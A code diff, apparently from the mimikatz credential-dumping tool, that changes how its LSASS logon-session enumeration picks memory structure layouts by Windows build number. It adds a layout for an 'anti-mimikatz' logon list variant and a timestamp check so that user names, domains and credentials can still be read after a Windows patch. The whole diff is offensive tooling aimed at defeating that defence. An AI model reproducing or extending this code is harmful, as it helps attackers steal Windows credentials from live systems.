@@ -42,6 +42,7 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_5) , FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_5, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , pSid)},
 	{sizeof(KIWI_MSV1_0_LIST_6) , FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_6, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , pSid)},
+	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid)},
 	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid)},
 	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid)}
 };
@@ -301,14 +302,21 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 		sessionData.cLsass = &cLsass;
 		sessionData.lsassLocalHelper = lsassLocalHelper;
 
-		if(cLsass.osContext.MajorVersion < 6)
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
 			helper = &lsassEnumHelpers[0];
-		else if(cLsass.osContext.MinorVersion < 2)
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
 			helper = &lsassEnumHelpers[1];
-		else if(cLsass.osContext.MinorVersion < 3)
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
 			helper = &lsassEnumHelpers[2];
-		else
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
 			helper = &lsassEnumHelpers[3];
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
+			helper = &lsassEnumHelpers[5];
+		else
+			helper = &lsassEnumHelpers[6];
+
+		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
+			helper++;
 
 		securityStruct.hMemory = cLsass.hLsassMem;
 		securityStruct.address = LogonSessionListCount;
